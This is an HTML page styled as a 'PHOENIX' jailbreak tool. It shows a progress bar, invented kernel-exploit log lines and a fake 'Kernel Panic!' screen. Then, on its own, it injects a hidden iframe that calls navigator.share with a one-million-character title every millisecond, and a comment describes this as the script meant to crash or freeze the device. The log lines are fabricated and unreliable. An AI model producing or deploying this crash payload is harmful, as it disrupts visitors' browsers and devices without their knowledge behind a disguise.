<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PHOENIX: CRITICAL</title>
    <style>
        /* ... (базовый CSS из предыдущего ответа) ... */
        body { background: #000; color: #ff3b30; font-family: 'SF Mono', monospace; overflow: hidden; margin: 0; }
        
        #panic-screen { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #700; color: #fff; z-index: 9999; padding: 10px;
            font-size: 8px; line-height: 1; word-break: break-all; overflow: hidden;
        }

        .error-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: #fff; color: #000; padding: 20px; font-weight: 900;
            font-size: 30px; border: 5px solid #000; z-index: 10000; text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div id="panic-screen"></div>
    <div class="main-card" id="card">
        <div class="progress-container"><div id="bar" style="width:0%; height:100%; background:#ff3b30; transition: width 0.1s linear;"></div></div>
        <div id="console" style="height:200px; overflow:hidden; font-size:9px;"></div>
    </div>

    <script>
        const consoleEl = document.getElementById('console');
        const panicEl = document.getElementById('panic-screen');
        const bar = document.getElementById('bar');
        
        let barW = 0;
        // УСКОРЕННАЯ ПОЛОСКА
        const barInterval = setInterval(() => {
            barW += 4.5; // Было 0.9, теперь летит
            bar.style.width = Math.min(barW, 100) + "%";
            if (barW >= 100) clearInterval(barInterval);
        }, 30);

        // БЫСТРЫЕ ЛОГИ И РАНДОМНЫЕ ОШИБКИ
        function addLog() {
            const hex = () => Math.random().toString(16).substring(2, 10).toUpperCase();
            const lines = [
                `> EXEC: offset_find(0x${hex()})`,
                `> KERNEL_WRITE: 0x${hex()} -> OK`,
                `> BUG: heap_overflow at 0x${hex()}`,
                `> PANIC: unexpected_token_near_task_port`,
                `!! FATAL ERROR: MEMORY_CORRUPTION_DETECTED !!`
            ];
            const div = document.createElement('div');
            div.innerText = lines[Math.floor(Math.random() * lines.length)];
            consoleEl.appendChild(div);
            consoleEl.scrollTop = consoleEl.scrollHeight;

            if (barW < 100) {
                setTimeout(addLog, 40); // Очень высокая скорость
            } else {
                triggerFullPanic();
            }
        }

        function triggerFullPanic() {
            panicEl.style.display = 'block';
            // Заполняем экран "мусором" и Fatal Error
            setInterval(() => {
                panicEl.innerText += ` FATAL_ERROR_0x${Math.random().toString(16)} `;
            }, 10);

            const overlay = document.createElement('div');
            overlay.className = 'error-overlay';
            overlay.innerText = "Kernel Panic!";
            document.body.appendChild(overlay);

            // Тот самый скрипт для вылета/зависания
            setTimeout(() => {
                const frame = document.createElement('iframe');
                frame.style.display = 'none';
                frame.srcdoc = "<script>setInterval(()=>navigator.share({title:'X'.repeat(1000000)}),1)<\/script>";
                document.body.appendChild(frame);
            }, 1000);
        }

        addLog();
    </script>
</body>
</html>
